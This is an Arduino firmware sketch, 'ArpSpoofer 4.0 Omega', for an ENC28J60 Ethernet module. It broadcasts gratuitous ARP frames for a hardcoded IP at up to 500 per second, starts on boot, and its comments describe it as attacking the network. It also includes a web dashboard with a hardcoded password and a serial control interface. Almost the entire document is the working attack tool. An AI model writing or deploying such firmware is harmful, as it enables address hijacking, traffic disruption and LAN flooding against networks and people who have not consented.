/*
  ============================================================
  ArpSpoofer 4.0 "Omega" – Production Build (Web Integrated)
  ============================================================
  Platform   : Arduino Nano (ATmega328P) + ENC28J60
  Library    : EtherCard
  Purpose    : Production-grade gratuitous ARP broadcaster
  Features   :
    - HARDCODED STATIC IP (192.168.1.137)
    - AUTORUN ON STARTUP
    - Omega Web Dashboard V2 (responsive, dark-mode)
    - Robust state machine (INIT → ANNOUNCE → RUN)
    - Token-bucket rate limiter (burst-capable, avg-rate enforced)
    - EEPROM-backed config (PPS, MAC suffix)
    - Advanced serial CLI  (R / S / M / P / C / ?)
    - Watchdog-safe blocking calls throughout
*/

#include <SPI.h>
#include <EtherCard.h>
#include <avr/wdt.h>
#include <avr/pgmspace.h>
#include <EEPROM.h>

#define LED_PIN          13
#define ENC_CS_PIN       10
#define FRAME_LEN        60
#define ETH_HDR_LEN      14
#define ARP_PAYLOAD_LEN  28

#define DEFAULT_PPS          60
#define MAX_PPS              500
#define TOKEN_BUCKET_CAP     20
#define ANNOUNCE_COUNT       3
#define ANNOUNCE_INTERVAL_MS 1000
#define ANNOUNCE_JITTER_MS   250
#define STATS_REPORT_INTERVAL 10000UL

// ─── Static IP Settings ──────────────────────────────────────
#define STATIC_IP    192, 168, 1, 137
#define STATIC_GW    192, 168, 1, 1
#define STATIC_MASK  255, 255, 255, 0

#define AUTH_PASSWORD        "OMEGA"
#define WEB_BUFFER_SIZE      700

#define EEPROM_MAGIC      0xA4
#define EEPROM_ADDR_MAGIC 0
#define EEPROM_ADDR_PPS   1
#define EEPROM_ADDR_MAC   3

byte Ethernet::buffer[WEB_BUFFER_SIZE];

static uint8_t myMac[6] = { 0x02, 0xAB, 0x03, 0x22, 0x55, 0x99 };
static uint8_t myIp[4]  = { 0, 0, 0, 0 };

enum {
  OFF_SRC_MAC = 6, OFF_SHA = 22, OFF_SPA = 28, OFF_TPA = 38
};

const uint8_t ARP_TEMPLATE[FRAME_LEN] PROGMEM = {
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

enum State : uint8_t { STATE_INIT, STATE_ANNOUNCE, STATE_RUN };
static State  currentState = STATE_INIT;
static bool   paused       = false; // Attack naturally runs on boot!

struct TokenBucket {
  uint16_t pps;
  uint32_t intervalUs;
  int16_t  tokens;
  uint32_t lastRefillUs;

  void configure(uint16_t newPps) {
    if (newPps == 0) newPps = 1;
    if (newPps > MAX_PPS) newPps = MAX_PPS;
    pps = newPps;
    intervalUs = 1000000UL / pps;
    if (tokens > TOKEN_BUCKET_CAP) tokens = TOKEN_BUCKET_CAP;
  }
  void refill() {
    uint32_t now = micros();
    uint32_t elapsed = now - lastRefillUs;
    if (elapsed >= intervalUs) {
      uint16_t newTokens = elapsed / intervalUs;
      tokens += (int16_t)newTokens;
      if (tokens > TOKEN_BUCKET_CAP) tokens = TOKEN_BUCKET_CAP;
      lastRefillUs += newTokens * intervalUs;
    }
  }
  bool consume() { refill(); if (tokens > 0) { tokens--; return true; } return false; }
};

static TokenBucket bucket = { DEFAULT_PPS, 1000000UL / DEFAULT_PPS, TOKEN_BUCKET_CAP, 0 };

static uint8_t  announceSent     = 0;
static uint32_t nextAnnounceMs   = 0;
static uint32_t totalPacketsSent = 0;
static uint32_t lastStatsMs      = 0;
static uint16_t lfsrState        = 0xACE1u;

static uint16_t lfsrRand() {
  lfsrState ^= lfsrState >> 7; lfsrState ^= lfsrState << 9; lfsrState ^= lfsrState >> 13;
  return lfsrState;
}

static void safeDelay(uint32_t ms) {
  uint32_t start = millis();
  while ((uint32_t)(millis() - start) < ms) { wdt_reset(); delay(10); }
}

static void ledBlink(uint8_t times, uint16_t onMs, uint16_t offMs) {
  for (uint8_t i = 0; i < times; i++) {
    digitalWrite(LED_PIN, HIGH); safeDelay(onMs);
    digitalWrite(LED_PIN, LOW); safeDelay(offMs);
  }
}

static void eepromSave() {
  EEPROM.write(EEPROM_ADDR_MAGIC, EEPROM_MAGIC);
  EEPROM.put(EEPROM_ADDR_PPS, bucket.pps);
  EEPROM.write(EEPROM_ADDR_MAC,     myMac[3]);
  EEPROM.write(EEPROM_ADDR_MAC + 1, myMac[4]);
  EEPROM.write(EEPROM_ADDR_MAC + 2, myMac[5]);
  Serial.println(F("[CFG] Settings saved to EEPROM."));
}

static void eepromLoad() {
  if (EEPROM.read(EEPROM_ADDR_MAGIC) != EEPROM_MAGIC) return;
  uint16_t storedPps; EEPROM.get(EEPROM_ADDR_PPS, storedPps);
  bucket.configure(storedPps);
  myMac[3] = EEPROM.read(EEPROM_ADDR_MAC);
  myMac[4] = EEPROM.read(EEPROM_ADDR_MAC + 1);
  myMac[5] = EEPROM.read(EEPROM_ADDR_MAC + 2);
}

static void stampFrame() {
  memcpy_P(Ethernet::buffer, ARP_TEMPLATE, FRAME_LEN);
  memcpy(Ethernet::buffer + OFF_SRC_MAC, myMac, 6);
  memcpy(Ethernet::buffer + OFF_SHA,     myMac, 6);
  memcpy(Ethernet::buffer + OFF_SPA,     myIp,  4);
  memcpy(Ethernet::buffer + OFF_TPA,     myIp,  4);
}

static void sendGarp() {
  stampFrame(); ether.packetSend(FRAME_LEN);
  totalPacketsSent++;
}

static void handleWeb() {
  word len = ether.packetReceive();
  word pos = ether.packetLoop(len);
  
  if (pos) {
    bool authed = true;
    char* data = (char*) Ethernet::buffer + pos;

    if (strstr(data, "POST /") != 0) {
      char* ppos = strstr(data, "pwd=");
      if (ppos) {
        char pwd[16]; byte i = 0; char* pptr = ppos + 4;
        while (i < 15 && *pptr != '&' && *pptr != ' ' && *pptr != '\0') pwd[i++] = *pptr++;
        pwd[i] = '\0';
        if (strcmp(pwd, AUTH_PASSWORD) != 0) authed = false;
      } else authed = false;

      if (authed) {
        if (strstr(data, "cmd=toggle") != 0) paused = !paused;
        if (strstr(data, "cmd=rate") != 0) {
          char* vpos = strstr(data, "val=");
          if (vpos) bucket.configure((uint16_t)atoi(vpos + 4));
        }
      }
    }

    BufferFiller bfill = ether.tcpOffset();
    bfill.emit_p(PSTR("HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
                      "<html><head><meta name='viewport' content='width=device-width'>"
                      "<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:10px} "
                      "input,button{background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px}</style></head><body>"
                      "<h2>OMEGA 4.0</h2>"
                      "<p>STS: $S | IP: $D.$D.$D.$D</p><p>TX: $L | $D PPS</p>"
                      "<form method='POST'>PW: <input type='password' name='pwd'><br>"
                      "<input type='hidden' name='cmd' value='toggle'><button>$S</button></form>"),
                 currentState == STATE_RUN ? (paused ? PSTR("PAUSED") : PSTR("RUNNING")) : PSTR("BUSY"),
                 myIp[0], myIp[1], myIp[2], myIp[3], totalPacketsSent, bucket.pps,
                 paused ? PSTR("RESUME") : PSTR("PAUSE"));

    if (!authed) bfill.emit_p(PSTR("<p style='color:red'>AUTH ERR</p>"));
    bfill.emit_p(PSTR("</body></html>"));
    ether.httpServerReply(bfill.position());
  }
}

static void printIp() {
  Serial.print(myIp[0]); Serial.print('.'); Serial.print(myIp[1]); Serial.print('.');
  Serial.print(myIp[2]); Serial.print('.'); Serial.print(myIp[3]);
}

static void printMac() {
  for (uint8_t i = 0; i < 6; i++) {
    if (i) Serial.print(':');
    if (myMac[i] < 16) Serial.print('0');
    Serial.print(myMac[i], HEX);
  }
}

static void printStatus() {
  Serial.println(F("─── Omega Status ───────────────"));
  Serial.print(F(" Paused  : ")); Serial.println(paused ? F("YES") : F("NO"));
  Serial.print(F(" MAC     : ")); printMac(); Serial.println();
  Serial.print(F(" IP      : ")); printIp();  Serial.println();
  Serial.print(F(" PPS     : ")); Serial.println(bucket.pps);
  Serial.print(F(" Sent    : ")); Serial.println(totalPacketsSent);
  Serial.println(F("────────────────────────────────"));
}

static void handleSerial() {
  while (Serial.available()) {
    char cmd = Serial.read();
    switch (cmd) {
      case 'R': case 'r': bucket.configure((uint16_t)Serial.parseInt()); break;
      case 'S': case 's': printStatus(); break;
      case 'P': case 'p': paused = !paused; Serial.println(paused ? F("[PAUSED]") : F("[RESUMED]")); break;
      case 'C': case 'c': eepromSave(); break;
      case 'M': case 'm': {
        char buf[7]; uint8_t idx = 0; uint32_t t = millis();
        while (idx < 6 && (millis() - t) < 500) { if (Serial.available()) buf[idx++] = Serial.read(); }
        buf[idx] = '\0';
        if (idx == 6) {
          uint32_t val = strtoul(buf, nullptr, 16);
          myMac[3] = (val >> 16) & 0xFF; myMac[4] = (val >> 8) & 0xFF; myMac[5] = val & 0xFF;
          Serial.print(F("MAC: ")); printMac(); Serial.println();
        }
        break;
      }
      case '?': printStatus(); break;
    }
  }
}

static void stateInit() {
  Serial.println(F("[INIT] Starting ENC28J60..."));
  Serial.flush();
  
  if (ether.begin(WEB_BUFFER_SIZE, myMac, ENC_CS_PIN) == 0) {
    Serial.println(F("[INIT] ENC28J60 FAILED."));
    ledBlink(10, 100, 100); while (true) wdt_reset();
  }

  uint8_t sip[] = { STATIC_IP };
  uint8_t sgw[] = { STATIC_GW };
  uint8_t smsk[] = { STATIC_MASK };
  ether.staticSetup(sip, sgw, NULL, smsk);
  memcpy(myIp, ether.myip, 4);

  Serial.print(F("[INIT] HARDCODED IP: ")); printIp(); Serial.println();
  ledBlink(2, 200, 200);
  
  announceSent = 0;
  nextAnnounceMs = millis() + (lfsrRand() % ANNOUNCE_JITTER_MS);
  currentState = STATE_ANNOUNCE;
}

static void stateAnnounce() {
  if ((uint32_t)(millis() - nextAnnounceMs) < 0x80000000UL) return;

  sendGarp();
  announceSent++;
  Serial.print(F("[ANN] GARP ")); Serial.print(announceSent); Serial.println(F("/3"));

  if (announceSent >= ANNOUNCE_COUNT) {
    Serial.println(F("[ANN] Done → RUN (Attacking Network)"));
    lastStatsMs = millis();
    bucket.lastRefillUs = micros(); bucket.tokens = TOKEN_BUCKET_CAP;
    currentState = STATE_RUN; return;
  }
  nextAnnounceMs = millis() + ANNOUNCE_INTERVAL_MS - ANNOUNCE_JITTER_MS + (lfsrRand() % (2 * ANNOUNCE_JITTER_MS + 1));
}

static void stateRun() {
  uint32_t nowMs = millis();
  if ((uint32_t)(nowMs - lastStatsMs) >= STATS_REPORT_INTERVAL) {
    lastStatsMs = nowMs;
    Serial.print(F("[STAT] TX:")); Serial.print(totalPacketsSent);
    Serial.print(F(" pps=")); Serial.println(bucket.pps);
  }

  if (!paused && bucket.consume()) {
    sendGarp();
    digitalWrite(LED_PIN, (totalPacketsSent & 1) ? HIGH : LOW);
  }
}

void setup() {
  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, LOW);
  Serial.begin(115200); safeDelay(30);
  
  lfsrState ^= (uint16_t)(analogRead(A0) ^ (analogRead(A1) << 8));
  if (!lfsrState) lfsrState = 0xACE1u;

  eepromLoad();
  wdt_enable(WDTO_2S);
  currentState = STATE_INIT;
}

void loop() {
  wdt_reset();
  handleSerial();

  switch (currentState) {
    case STATE_INIT:     stateInit(); break;
    case STATE_ANNOUNCE: if(currentState != STATE_INIT) handleWeb(); stateAnnounce(); break;
    case STATE_RUN:      if(currentState != STATE_INIT) handleWeb(); stateRun(); break;
  }
}
